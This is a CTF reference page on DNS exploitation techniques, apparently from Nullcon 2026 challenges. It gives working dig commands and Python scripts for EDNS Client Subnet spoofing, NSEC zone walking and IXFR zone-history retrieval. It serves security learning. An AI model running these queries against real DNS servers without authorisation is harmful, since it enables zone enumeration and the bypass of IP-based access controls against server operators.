# CTF Misc - DNS Exploitation Techniques

## EDNS Client Subnet (ECS) Spoofing
**Pattern (DragoNflieS, Nullcon 2026):** DNS server returns different records based on client IP. Spoof source using ECS option.

```bash
# dig with ECS option
dig @52.59.124.14 -p 5053 flag.example.com TXT +subnet=10.13.37.1/24
```

```python
import dns.edns, dns.query, dns.message

q = dns.message.make_query("flag.example.com", "TXT", use_edns=True)
ecs = dns.edns.ECSOption("10.13.37.1", 24, 0)  # Internal network subnet
q.use_edns(0, 0, 8192, options=[ecs])
r = dns.query.udp(q, "target_ip", port=5053, timeout=1.5)
for rrset in r.answer:
    for rd in rrset:
        print(b"".join(rd.strings).decode())
```

**Key insight:** Try leet-speak subnets like `10.13.37.0/24` (1337), common internal ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).

## DNSSEC NSEC Walking
**Pattern (DiNoS, Nullcon 2026):** NSEC records in DNSSEC zones reveal all domain names by chaining to the next name.

```python
import subprocess, re

def walk_nsec(server, port, base_domain):
    """Walk NSEC chain to enumerate entire zone."""
    current = base_domain
    visited = set()
    records = []
    while current not in visited:
        visited.add(current)
        out = subprocess.check_output(
            ["dig", f"@{server}", "-p", str(port), "ANY", current, "+dnssec"],
            text=True)
        # Extract TXT records
        for m in re.finditer(r'TXT\s+"([^"]*)"', out):
            records.append((current, m.group(1)))
        # Follow NSEC chain
        m = re.search(r'NSEC\s+(\S+)', out)
        if m:
            current = m.group(1).rstrip('.')
        else:
            break
    return records
```

## Incremental Zone Transfer (IXFR)
**Pattern (Zoney, Nullcon 2026):** When AXFR is blocked, IXFR from old serial reveals zone update history including deleted records.

```bash
# AXFR blocked? Try IXFR from serial 0
dig @server -p 5054 flag.example.com IXFR=0
# Look for historical TXT records in the diff output
```
